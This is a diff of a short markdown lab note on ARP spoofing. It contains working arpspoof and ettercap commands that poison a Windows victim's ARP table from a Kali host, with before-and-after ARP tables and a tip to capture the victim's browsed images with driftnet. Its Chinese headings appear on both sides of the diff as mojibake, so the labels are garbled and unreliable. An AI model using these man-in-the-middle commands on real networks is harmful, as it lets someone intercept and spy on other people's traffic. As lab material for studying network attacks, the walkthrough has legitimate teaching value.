@@ -1,49 +1,49 @@
 ## arpspoof & ettercap
 
-### ¹¥»÷Ç°
+### æ”»å‡»å‰
 
-	¹¥»÷»ú£ºkali 172.16.8.182
+	æ”»å‡»æœºï¼škali 172.16.8.182
 		root@kali:~# arp
 		Address                  HWtype  HWaddress           Flags Mask            Iface
 		172.16.8.180             ether   12:24:36:48:60:72   C                     eth1
 		172.16.0.1               ether   d4:3d:7e:f8:98:44   C                     eth1
 
-	ÊÜº¦»ú£ºwin8.1 172.16.8.180
+	å—å®³æœºï¼šwin8.1 172.16.8.180
 		C:\Users\Michael.zou>arp -a
 
-		½Ó¿Ú: 172.16.8.180 --- 0x3
-		  Internet µØÖ·         ÎïÀíµØÖ·              ÀàĞÍ
-		  172.16.0.1            d4-3d-7e-f8-98-44     ¶¯Ì¬
-		  172.16.8.182          08-00-27-65-ee-95     ¶¯Ì¬
+		æ¥å£: 172.16.8.180 --- 0x3
+		  Internet åœ°å€         ç‰©ç†åœ°å€              ç±»å‹
+		  172.16.0.1            d4-3d-7e-f8-98-44     åŠ¨æ€
+		  172.16.8.182          08-00-27-65-ee-95     åŠ¨æ€
 
-### ARP ¹¥»÷²Ù×÷
+### ARP æ”»å‡»æ“ä½œ
 
 	root@kali:~# echo 1 >> /proc/sys/net/ipv4/ip_forward
 	root@kali:~# arpspoof -i eth1 -t 172.16.8.180 172.16.0.1
 	root@kali:~# arpspoof -i eth1 -t 172.16.0.1 172.16.8.180
 	
-	»ò£º
+	æˆ–ï¼š
 	root@kali:~# echo 1 >> /proc/sys/net/ipv4/ip_forward
 	root@kali:~# arpspoof -i eth1 -c both -t 172.16.8.180 172.16.0.1
 	
-	»ò£º
+	æˆ–ï¼š
 	root@kali:~# echo 1 >> /proc/sys/net/ipv4/ip_forward
 	root@kali:~# ettercap -T -i eth1 -M arp:remote /172.16.0.1/ /172.16.8.180/
 		  
-### ¹¥»÷ºó
+### æ”»å‡»å
 
-	ÊÜº¦»ú£ºwin8.1 172.16.8.180
+	å—å®³æœºï¼šwin8.1 172.16.8.180
 		C:\Users\Michael.zou>arp -a
 
-		½Ó¿Ú: 172.16.8.180 --- 0x3
-		  Internet µØÖ·         ÎïÀíµØÖ·              ÀàĞÍ
-		  172.16.0.1            08-00-27-65-ee-95     ¶¯Ì¬
-		  172.16.8.182          08-00-27-65-ee-95     ¶¯Ì¬
+		æ¥å£: 172.16.8.180 --- 0x3
+		  Internet åœ°å€         ç‰©ç†åœ°å€              ç±»å‹
+		  172.16.0.1            08-00-27-65-ee-95     åŠ¨æ€
+		  172.16.8.182          08-00-27-65-ee-95     åŠ¨æ€
 
-	ÊÜº¦»ú£ºwin8.1 172.16.8.180
+	å—å®³æœºï¼šwin8.1 172.16.8.180
 		root@kali:~# arp
 		Address                  HWtype  HWaddress           Flags Mask            Iface
 		172.16.8.180             ether   12:24:36:48:60:72   C                     eth1
 		172.16.0.1               ether   d4:3d:7e:f8:98:44   C                     eth1
 		
-	´ËÊ±¿ÉÊ¹ÓÃ driftnet -i eth1 ²é¿´ÊÜº¦»úÔÚÍøÂçÖĞä¯ÀÀµÄÍ¼Æ¬Êı¾İ
+	æ­¤æ—¶å¯ä½¿ç”¨ driftnet -i eth1 æŸ¥çœ‹å—å®³æœºåœ¨ç½‘ç»œä¸­æµè§ˆçš„å›¾ç‰‡æ•°æ®
